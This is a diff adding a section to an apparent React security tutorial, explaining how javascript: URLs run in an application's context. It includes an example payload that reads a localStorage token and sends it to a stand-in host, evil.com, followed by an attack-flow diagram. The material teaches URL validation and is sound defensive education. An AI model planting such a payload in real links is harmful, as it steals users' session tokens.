@@ -112,6 +112,35 @@ return &lt;AdminDashboard /&gt;;</code></pre>
   return url.startsWith('https://') || url.startsWith('http://');
 }</code></pre>
 
+<h3>How javascript: URLs Become Dangerous</h3>
+
+<p>An attacker cannot directly access your application data from another computer. However, if a user clicks a <b>javascript:</b> link, the browser executes that JavaScript in your application's context.</p>
+
+<div class="file-name">Malicious URL</div>
+<pre class="language-text"><code class="language-text">javascript:fetch(
+  'https://evil.com/steal?token=' +
+  localStorage.getItem('token')
+)</code></pre>
+
+<div class="danger">
+When the user clicks this link, the JavaScript runs inside the current page and can access anything that normal JavaScript can access, including localStorage, sessionStorage, and page data.
+</div>
+
+<div class="file-name">Attack Flow</div>
+<div class="flow">
+User Clicks javascript: Link
+<br>↓<br>
+Browser Executes JavaScript
+<br>↓<br>
+Reads localStorage Token
+<br>↓<br>
+Sends Token To Attacker
+</div>
+
+<div class="warning">
+The danger is not the URL itself. The danger is that the browser treats <b>javascript:</b> as executable code and runs it with the same permissions as your application.
+</div>
+
 <h2>6. Third-Party Package Vulnerabilities</h2>
 <p>React apps usually depend on many npm packages. A vulnerable package can create security problems.</p>
 
